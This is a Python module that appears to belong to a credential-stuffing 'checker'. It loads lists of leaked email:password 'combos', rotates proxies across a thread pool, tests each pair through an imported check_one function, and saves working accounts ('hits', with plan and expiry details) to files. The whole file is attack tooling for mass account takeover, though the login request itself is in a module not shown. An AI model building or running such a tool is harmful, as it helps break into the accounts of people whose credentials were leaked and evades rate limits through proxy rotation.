"""Check runner: combo loading, thread pool, result files."""
import os
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

from .api import check_one
from .ui import console, make_progress, print_fail, print_hit, print_summary


def load_combos(src: str) -> list[tuple[str, str]]:
    combos, seen = [], set()
    with open(src, encoding="utf-8", errors="ignore") as f:
        for raw in f:
            line = raw.strip()
            if not line or ":" not in line or line in seen:
                continue
            seen.add(line)
            email, password = line.split(":", 1)
            if "@" in email and password:
                combos.append((email.strip(), password.strip()))
    return combos


def load_proxies(path: str | None, single: str | None) -> list[str]:
    if path and os.path.isfile(path):
        with open(path, encoding="utf-8", errors="ignore") as f:
            return [l.strip() for l in f if l.strip()]
    return [single] if single else []


def run(combos: list[tuple[str, str]], proxies: list[str],
        threads: int, timeout: int, outdir: str) -> tuple[int, int]:
    os.makedirs(outdir, exist_ok=True)
    hit_path = os.path.join(outdir, f"hits_{datetime.now():%Y%m%d_%H%M%S}.txt")
    all_path = os.path.join(outdir, "all.txt")
    console.print(f"[dim]  hits -> {hit_path}[/dim]\n")

    counts = {"hit": 0, "fail": 0}
    lock = threading.Lock()
    progress, task = make_progress(len(combos))

    def worker(idx: int, email: str, password: str) -> None:
        proxy = proxies[idx % len(proxies)] if proxies else None
        try:
            res = check_one(email, password, proxy, timeout)
        except Exception as e:
            from .config import CheckResult
            res = CheckResult(status="FAIL", email=email, password=password, msg=str(e)[:200])
        with lock:
            if res.status == "HIT":
                counts["hit"] += 1
                with open(hit_path, "a", encoding="utf-8") as hf:
                    hf.write(res.hit_line() + "\n")
                print_hit(res.email, res.plan, res.expire, res.days)
            else:
                counts["fail"] += 1
                print_fail(res.email, res.msg)
            with open(all_path, "a", encoding="utf-8") as af:
                af.write(f"[{res.status}] {res.email}:{res.password} :: {res.msg}\n")
            progress.update(task, advance=1, hit=counts["hit"], fail=counts["fail"])

    t0 = time.time()
    with progress:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            futs = [ex.submit(worker, i, e, p) for i, (e, p) in enumerate(combos)]
            for f in futs:
                f.result()
    print_summary(len(combos), counts["hit"], counts["fail"], time.time() - t0, hit_path)
    return counts["hit"], counts["fail"]
